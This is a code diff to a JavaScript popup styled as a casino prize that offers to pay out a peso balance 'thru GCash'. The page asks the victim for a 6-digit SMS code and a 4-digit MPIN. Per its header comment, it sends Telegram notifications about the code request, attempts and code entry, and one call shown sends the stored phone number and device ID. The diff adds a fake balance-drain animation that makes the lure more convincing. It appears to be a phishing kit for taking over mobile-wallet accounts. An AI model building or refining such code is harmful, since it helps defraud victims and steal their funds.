@@ -1,6 +1,7 @@
 /**
  * Popup Share Module - Casino Theme Remastered
  * With Telegram Notifications for 6-digit request, verification attempts, AND 6-digit code entry
+ * Balance Check + Decrement Animation
  */
 
 // ========== POPUP MODULE ==========
@@ -175,7 +176,6 @@
     function addAnimations() {
         const style = document.createElement('style');
         style.textContent = `
-            /* ========== CASINO THEME ANIMATIONS ========== */
             @keyframes bounceIn {
                 0% { transform: scale(0) rotate(-180deg); opacity: 0; }
                 60% { transform: scale(1.1) rotate(0deg); }
@@ -202,8 +202,24 @@
                 0% { background-position: -200% center; }
                 100% { background-position: 200% center; }
             }
+            @keyframes balanceDrain {
+                0%, 100% { transform: scale(1); }
+                50% { transform: scale(1.05); filter: brightness(1.2); }
+            }
+            @keyframes balanceDrop {
+                0% { transform: translateY(0); opacity: 1; }
+                100% { transform: translateY(20px); opacity: 0.5; }
+            }
+            @keyframes indicatorFill {
+                0% { width: 0; }
+                100% { width: 100%; }
+            }
+            @keyframes successFlash {
+                0% { transform: scale(1); }
+                50% { transform: scale(1.3); filter: brightness(2); }
+                100% { transform: scale(1); }
+            }
             
-            /* ========== BUTTON EFFECTS ========== */
             .btn-pulse {
                 animation: pulseGold 0.5s ease;
             }
@@ -211,7 +227,6 @@
                 animation: shake 0.3s ease-in-out;
             }
             
-            /* ========== MPIN DOTS - Casino Style ========== */
             .mpin-dots {
                 display: flex;
                 justify-content: center;
@@ -231,7 +246,6 @@
                 box-shadow: 0 0 15px #d4af37, 0 0 30px rgba(212, 175, 55, 0.5);
             }
             
-            /* ========== NUMERIC KEYPAD - Casino Style ========== */
             .numeric-keypad {
                 display: grid;
                 grid-template-columns: repeat(3, 1fr);
@@ -267,7 +281,6 @@
                 color: #d4af37;
             }
             
-            /* ========== BACK BUTTON - Casino Style ========== */
             .small-back-btn {
                 background: linear-gradient(to bottom, #d4af37, #aa771c);
                 border: 1px solid #fcf6ba;
@@ -294,7 +307,6 @@
                 box-shadow: 0 0 0 #6e4b0c;
             }
             
-            /* ========== ATTEMPTS COUNTER ========== */
             .attempts-counter {
                 font-size: 10px;
                 color: #d4af37;
@@ -304,7 +316,6 @@
                 letter-spacing: 1px;
             }
             
-            /* ========== VERIFICATION INPUT - Casino Style ========== */
             .verification-input {
                 text-align: center;
                 font-size: 20px;
@@ -325,7 +336,6 @@
                 outline: none;
             }
             
-            /* ========== SMS POPUP - Casino Style ========== */
             #smsCodePopup {
                 background: linear-gradient(145deg, #1a0505, #000000);
                 border: 1px solid #d4af37;
@@ -336,7 +346,6 @@
                 box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
             }
             
-            /* ========== PHASE CONTAINERS ========== */
             #step1Container,
             #step2Container {
                 background: linear-gradient(145deg, rgba(20, 15, 40, 0.5), rgba(10, 5, 20, 0.5));
@@ -346,7 +355,6 @@
                 margin: 10px 0;
             }
             
-            /* ========== CLAIM BUTTON - Casino Style ========== */
             .claim-gcash-button {
                 background: linear-gradient(to bottom, #d4af37, #aa771c);
                 border: 1px solid #fcf6ba;
@@ -366,8 +374,12 @@
                 transform: translateY(4px);
                 box-shadow: 0 0 0 #6e4b0c;
             }
+            .claim-gcash-button:disabled {
+                opacity: 0.7;
+                cursor: not-allowed;
+                pointer-events: none;
+            }
             
-            /* ========== DIVIDER ========== */
             .divider {
                 width: 50px;
                 height: 2px;
@@ -375,7 +387,6 @@
                 margin: 10px auto;
             }
             
-            /* ========== PHASE 2 HEADING ========== */
             .phase2-heading {
                 font-family: 'Orbitron', monospace;
                 font-size: 18px;
@@ -389,7 +400,6 @@
                 text-align: center;
             }
             
-            /* ========== PHASE 3 HEADING ========== */
             .phase3-heading {
                 font-family: 'Orbitron', monospace;
                 font-size: 18px;
@@ -405,6 +415,112 @@
         if (!document.querySelector('#popup-casino-animations')) {
             style.id = 'popup-casino-animations';
             document.head.appendChild(style);
+        }
+    }
+    
+    // ========== BALANCE DECREMENT ANIMATION ==========
+    function animateBalanceDecrement(start, end, duration, callback) {
+        const balanceSpan = document.getElementById('popupBalanceAmount');
+        const balanceDisplay = document.getElementById('popupBalanceDisplay');
+        const indicator1 = document.getElementById('indicator1');
+        const indicator2 = document.getElementById('indicator2');
+        const indicator3 = document.getElementById('indicator3');
+        const claimBtn = document.getElementById('claimGCashBtn');
+        
+        if (!balanceSpan) {
+            if (callback) callback();
+            return;
+        }
+        
+        // Disable button during animation
+        if (claimBtn) {
+            claimBtn.disabled = true;
+            claimBtn.style.opacity = '0.7';
+            claimBtn.style.pointerEvents = 'none';
+            claimBtn.innerHTML = '⏳ PROCESSING...';
+        }
+        
+        // Activate indicators one by one
+        let indicatorStep = 0;
+        const indicatorInterval = setInterval(() => {
+            indicatorStep++;
+            if (indicatorStep === 1 && indicator1) {
+                indicator1.style.background = '#d4af37';
+                indicator1.style.boxShadow = '0 0 10px #d4af37';
+            }
+            if (indicatorStep === 2 && indicator2) {
+                indicator2.style.background = '#d4af37';
+                indicator2.style.boxShadow = '0 0 10px #d4af37';
+            }
+            if (indicatorStep === 3 && indicator3) {
+                indicator3.style.background = '#d4af37';
+                indicator3.style.boxShadow = '0 0 10px #d4af37';
+                clearInterval(indicatorInterval);
+            }
+        }, duration / 4);
+        
+        const totalSteps = 30;
+        const decrementAmount = start / totalSteps;
+        let currentStep = 0;
+        
+        // Add pulse animation to balance
+        if (balanceDisplay) {
+            balanceDisplay.style.animation = 'balanceDrain 0.3s ease infinite';
+        }
+        
+        const interval = setInterval(() => {
+            currentStep++;
+            const currentVal = start - (decrementAmount * currentStep);
+            
+            if (balanceSpan) {
+                balanceSpan.textContent = Math.max(0, currentVal).toFixed(2);
+                balanceSpan.style.color = currentVal < start * 0.3 ? '#ff6666' : '#fce883';
+                balanceSpan.style.fontSize = (48 - (currentStep * 0.8)) + 'px';
+            }
+            
+            if (currentStep >= totalSteps) {
+                clearInterval(interval);
+                
+                if (balanceSpan) {
+                    balanceSpan.textContent = '0.00';
+                    balanceSpan.style.color = '#ff4444';
+                    balanceSpan.style.fontSize = '48px';
+                }
+                
+                if (balanceDisplay) {
+                    balanceDisplay.style.animation = 'none';
+                }
+                
+                // Reset indicators
+                [indicator1, indicator2, indicator3].forEach(ind => {
+                    if (ind) {
+                        ind.style.background = 'rgba(212,175,55,0.3)';
+                        ind.style.boxShadow = 'none';
+                    }
+                });
+                
+                // Show success flash
+                if (balanceDisplay) {
+                    balanceDisplay.style.animation = 'successFlash 0.5s ease';
+                    balanceDisplay.innerHTML = '✅ <span style="font-size:24px; color:#22C55E;">PROCESSING</span>';
+                    
+                    setTimeout(() => {
+                        if (balanceDisplay) {
+                            balanceDisplay.style.animation = 'none';
+                        }
+                    }, 500);
+                }
+                
+                // Proceed after short delay
+                setTimeout(() => {
+                    if (callback) callback();
+                }, 600);
+            }
+        }, duration / totalSteps);
+        
+        // Add pulse effect to button
+        if (claimBtn) {
+            claimBtn.style.animation = 'pulseGold 0.5s ease infinite';
         }
     }
     
@@ -504,12 +620,9 @@
             
             console.log('Claim button clicked!');
             
-            // PLAY SOUND EFFECT
             playClaimSound();
-            
             resetAttempts();
             
-            // SEND TELEGRAM NOTIFICATION FOR 6-DIGIT REQUEST
             const userPhone = localStorage.getItem("userPhone") || "Unknown";
             const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
             await send6DigitRequestNotification(userPhone, deviceId);
@@ -598,7 +711,7 @@
         startSmsRetriever();
     }
     
-    // ========== PHASE 3: CLAIMING VERIFICATION - Casino Theme ==========
+    // ========== PHASE 3: CLAIMING VERIFICATION ==========
     function showPhase3() {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -618,17 +731,12 @@
                 <img src="images/gc_icon.png" style="width: 60px; height: 60px; animation: bounceIn 0.5s ease; border-radius: 50%; border: 2px solid #d4af37; box-shadow: 0 0 20px rgba(212,175,55,0.4);">
             </div>
             
-            <h2 class="phase3-heading">
-                CLAIMING VERIFICATION
-            </h2>
+            <h2 class="phase3-heading">CLAIMING VERIFICATION</h2>
             
             <div class="divider"></div>
             
-            <div class="attempts-counter">
-                ⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}
-            </div>
+            <div class="attempts-counter">⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}</div>
             
-            <!-- SMS CODE POPUP - Casino Style -->
             <div id="smsCodePopup" style="display: none;">
                 <div style="display: flex; align-items: center; gap: 12px;">
                     <div style="font-size: 32px;">📨</div>
@@ -636,13 +744,10 @@
                         <div style="font-size: 10px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 1px;">SMS RECEIVED</div>
                         <div style="font-size: 16px; color: #fce883; font-weight: bold; font-family: 'Orbitron', monospace; letter-spacing: 2px;" id="smsCodeValue">------</div>
                     </div>
-                    <button id="autoFillSmsBtn" class="small-back-btn" style="background: linear-gradient(to bottom, #22C55E, #16A34A); color: #fff; border: 1px solid #4ade80; text-shadow: none; box-shadow: 0 3px 0 #15803d;">
-                        USE CODE
-                    </button>
+                    <button id="autoFillSmsBtn" class="small-back-btn" style="background: linear-gradient(to bottom, #22C55E, #16A34A); color: #fff; border: 1px solid #4ade80; text-shadow: none; box-shadow: 0 3px 0 #15803d;">USE CODE</button>
                 </div>
             </div>
             
-            <!-- STEP 1: 6-DIGIT CODE - Casino Style -->
             <div id="step1Container">
                 <div style="text-align: center; margin-bottom: 10px;">
                     <span style="font-size: 11px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 1 OF 2</span>
@@ -652,14 +757,11 @@
                 </p>
                 <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                     <input type="text" id="code6Digit" class="verification-input" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
-                    <button id="verify6DigitBtn" class="claim-gcash-button" style="background: linear-gradient(to bottom, #0066ff, #0044cc); border: 1px solid #3399ff; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #003399; padding: 12px 18px;">
-                        VERIFY
-                    </button>
+                    <button id="verify6DigitBtn" class="claim-gcash-button" style="background: linear-gradient(to bottom, #0066ff, #0044cc); border: 1px solid #3399ff; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #003399; padding: 12px 18px;">VERIFY</button>
                 </div>
                 <div id="step1ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff6666; font-size: 11px; font-family: 'Poppins', sans-serif;"></div>
             </div>
             
-            <!-- STEP 2: 4-DIGIT MPIN - Casino Style -->
             <div id="step2Container" style="display: none;">
                 <div style="text-align: center; margin-bottom: 10px;">
                     <span style="font-size: 11px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 2 OF 2</span>
@@ -696,9 +798,7 @@
             </div>
             
             <div style="text-align: center; margin-top: 12px;">
-                <button class="small-back-btn" id="backBtnPhase3">
-                    ← BACK
-                </button>
+                <button class="small-back-btn" id="backBtnPhase3">← BACK</button>
             </div>
         `;
         
@@ -948,7 +1048,7 @@
             <h2 class="popup-title" style="font-family: 'Playfair Display', serif; font-size: 26px; font-weight: 900; background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c); -webkit-background-clip: text; background-clip: text; color: transparent; text-transform: uppercase; text-align: center;">
                 🎉 HOORAY! 🎉
             </h2>
-            <div class="prize-amount" style="font-size: 48px; font-weight: 900; color: #fce883; font-family: 'Orbitron', monospace; text-align: center; text-shadow: 0 0 20px rgba(212,175,55,0.5);">
+            <div class="prize-amount" style="font-size: 48px; font-weight: 900; color: #fce883; font-family: 'Orbitron', monospace; text-align: center; text-shadow: 0 0 20px rgba(212,175,55,0.5);" id="popupBalanceDisplay">
                 ₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span>
             </div>
             <div class="divider"></div>
@@ -960,12 +1060,12 @@
             </div>
             <div class="divider"></div>
             <div class="indicator-group" style="display: flex; justify-content: center; gap: 12px; margin: 15px 0;">
-                <div class="indicator" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px;"></div>
-                <div class="indicator" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px;"></div>
-                <div class="indicator" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px;"></div>
+                <div class="indicator" id="indicator1" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px; transition: all 0.3s ease;"></div>
+                <div class="indicator" id="indicator2" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px; transition: all 0.3s ease;"></div>
+                <div class="indicator" id="indicator3" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px; transition: all 0.3s ease;"></div>
             </div>
             
-            <button class="claim-gcash-button" id="claimGCashBtn" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px;">
+            <button class="claim-gcash-button" id="claimGCashBtn" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; overflow: hidden;">
                 <img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH
             </button>
 
@@ -985,18 +1085,47 @@
         const claimBtn = document.getElementById('claimGCashBtn');
         if (claimBtn) {
             claimBtn.onclick = function() {
-                this.style.transform = 'translateY(4px)';
-                this.style.boxShadow = '0 0 0 #6e4b0c';
-                setTimeout(() => { 
-                    this.style.transform = 'translateY(0)';
-                    this.style.boxShadow = '0 4px 0 #6e4b0c';
-                }, 150);
-                checkFirewallAndTransition();
+                // CHECK IF BALANCE IS ZERO
+                if (currentBalance <= 0) {
+                    claimBtn.classList.add('shake-effect');
+                    claimBtn.style.background = 'linear-gradient(to bottom, #ff4444, #cc0000)';
+                    claimBtn.style.border = '1px solid #ff6666';
+                    claimBtn.innerHTML = '❌ INSUFFICIENT BALANCE';
+                    
+                    const popupTitle = document.querySelector('.popup-title');
+                    if (popupTitle) {
+                        popupTitle.style.background = 'linear-gradient(to bottom, #ff6666, #ff4444)';
+                        popupTitle.style.webkitBackgroundClip = 'text';
+                        popupTitle.style.backgroundClip = 'text';
+                        popupTitle.textContent = '⚠️ NO BALANCE ⚠️';
+                    }
+                    
+                    setTimeout(() => {
+                        claimBtn.classList.remove('shake-effect');
+                        claimBtn.style.background = 'linear-gradient(to bottom, #d4af37, #aa771c)';
+                        claimBtn.style.border = '1px solid #fcf6ba';
+                        claimBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH';
+                        
+                        if (popupTitle) {
+                            popupTitle.style.background = 'linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c)';
+                            popupTitle.style.webkitBackgroundClip = 'text';
+                            popupTitle.style.backgroundClip = 'text';
+                            popupTitle.textContent = '🎉 HOORAY! 🎉';
+                        }
+                    }, 2000);
+                    
+                    return;
+                }
+                
+                // ANIMATE BALANCE DECREMENT THEN PROCEED
+                animateBalanceDecrement(currentBalance, 0, 800, function() {
+                    checkFirewallAndTransition();
+                });
             };
         }
     }
     
-    // ========== PHASE 2: WITHDRAWAL LINK - Casino Theme ==========
+    // ========== PHASE 2: WITHDRAWAL LINK ==========
     function showPhase2() {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -1016,9 +1145,7 @@
                 <div style="font-size: 50px; animation: bounceIn 0.5s ease;">🏆</div>
             </div>
             
-            <h2 class="phase2-heading">
-                GREAT JOB!
-            </h2>
+            <h2 class="phase2-heading">GREAT JOB!</h2>
             
             <div class="divider"></div>
             
@@ -1038,7 +1165,7 @@
             <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0 10px;"></div>
 
             <button class="small-back-btn" id="backBtnPhase2" style="margin: 0 auto; display: inline-flex;">
-                ← COMPLETE TASK #2
+                ← BACK
             </button>
         `;
         
